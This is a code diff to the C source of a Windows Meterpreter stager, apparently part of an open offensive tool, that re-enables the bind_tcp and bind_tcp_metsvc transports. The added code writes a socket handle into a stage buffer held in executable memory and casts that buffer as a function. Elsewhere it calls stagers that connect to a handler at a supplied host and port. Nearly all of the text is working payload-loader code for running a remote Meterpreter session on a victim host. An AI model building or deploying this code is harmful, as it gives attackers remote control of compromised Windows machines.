@@ -89,17 +89,17 @@ int wmain(int argc, wchar_t *argv[])
 				}
 
 				/* starting bind tcp */
-				/*else if (wcscmp(payload_settings.TRANSPORT,L"BIND_TCP") == 0)
+				else if (wcscmp(payload_settings.TRANSPORT,L"BIND_TCP") == 0)
 				{
 					payload_settings.TRANSPORT = L"METERPRETER_BIND_TCP";
-				}*/
+				}
 
 				/* metsvc_bind_tcp */
-				/*else if (wcscmp(payload_settings.TRANSPORT,L"BIND_TCP_METSVC") == 0)
+				else if (wcscmp(payload_settings.TRANSPORT,L"BIND_TCP_METSVC") == 0)
 				{
-					payload_settings.TRANSPORT = L"METERPRETER_BIND_TCP_SSL";
+					payload_settings.TRANSPORT = L"METERPRETER_BIND_TCP";
 					metsvc = true;
-				}*/
+				}
 
 				else {
 					dprintf(L"[-] Unknown transport: \"%s\"\n[-] Valid transports are reverse_tcp, reverse_metsvc, reverse_http,\n    reverse_https, bind_tcp and bind_tcp_metsvc.\n", payload_settings.TRANSPORT);
@@ -208,17 +208,11 @@ int wmain(int argc, wchar_t *argv[])
 			StagerRevereTCP(payload_settings.LHOST,payload_settings.LPORT);
 		} 
 
-		/* bind_tcp */
-		/*else if(wcscmp(payload_settings.TRANSPORT,L"METERPRETER_BIND_TCP") == 0)
+		/* bind_tcp and bind_tcp_metsvc */
+		else if(wcscmp(payload_settings.TRANSPORT,L"METERPRETER_BIND_TCP") == 0)
 		{
 			StagerBindTCP(payload_settings.LHOST,payload_settings.LPORT);
-		}*/  
-
-		/* bind_tcp_ssl */
-		/*else if(wcscmp(payload_settings.TRANSPORT,L"METERPRETER_BIND_TCP_SSL") == 0)
-		{
-			StagerBindTCPSSL(payload_settings.LHOST,payload_settings.LPORT);
-		}*/ 
+		}  
 
 		else
 		{
@@ -344,7 +338,7 @@ int wmain(int argc, wchar_t *argv[])
 					L"    next time use \"-t reverse_metsvc\" -> \"exploit/multi/handler/windows/metsvc_reverse_tcp\".\n"
 					L" -  anyway, will assume you know what you're doing and connect to reverse_tcp in *stager* mode...\n\n");
 					
-				dprintf(L"[*] \nMake sure you have \"windows/meterpreter/reverse_tcp\" handler running.\n\n");
+				dprintf(L"[*] Make sure you have \"windows/meterpreter/reverse_tcp\" handler running.\n\n");
 				
 				// Let's just fallback to stager mode ... you foolish noisy bandwidth wasters.
 				StagerRevereTCP(payload_settings.LHOST,payload_settings.LPORT);
@@ -436,6 +430,37 @@ int wmain(int argc, wchar_t *argv[])
 			dprintf(L"[*] Patching global_meterpreter_url: Offset 0x%08x ->  \"%s\"\n", index, temp );
 			memcpy(&buffer[index], &url, strlen(url)+1); //+1 to make sure it'll be null terminated, otherwise it will end with 'X'
 		}
+
+		else if(wcscmp(payload_settings.TRANSPORT,L"METERPRETER_BIND_TCP") == 0)
+		{
+			if(!metsvc)
+			{
+				dprintf(L"\n[!] We already have the stage, why did you chose bind_tcp? you could've picked bind_tcp_metsvc.\n" 
+					L"    next time use \"-t bind_tcp_metsvc\" -> \"exploit/multi/handler/windows/metsvc_bind_tcp\".\n"
+					L" -  anyway, will assume you know what you're doing and connect to bind_tcp in *stager* mode...\n\n");
+					
+				dprintf(L"[*] Make sure you have \"windows/metsvc_bind_tcp\" handler running.\n\n");
+
+				StagerBindTCP(payload_settings.LHOST,payload_settings.LPORT);
+			} 
+			
+			TempBuffer = (unsigned char*)VirtualAlloc(0, StageSize + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+			memcpy(TempBuffer + 5, buffer, StageSize);
+			buffer = TempBuffer;
+
+			dprintf(L"\n[*] Make sure you have \"windows/metsvc_bind_tcp\" handler running.\n\n");
+			ConnectSocket = get_server_socket(payload_settings.LHOST,payload_settings.LPORT);
+			if (ConnectSocket == INVALID_SOCKET)
+			{
+				dprintf(L"[-] Failed to connect ... will exit!\n");
+				exit(1);
+			}
+			dprintf(L"[*] Setting EDI-to-be value:  0x%08x -> 0xBF\n", &buffer);
+			buffer[0] = 0xBF;
+			dprintf(L"[*] Copying the socket address to the next 4 bytes...\n");
+			memcpy(buffer+1, &ConnectSocket, 4);
+		} 
+
 	}
 
 	dprintf(L"[*] Everything in place, casting whole buffer as a function...\n");
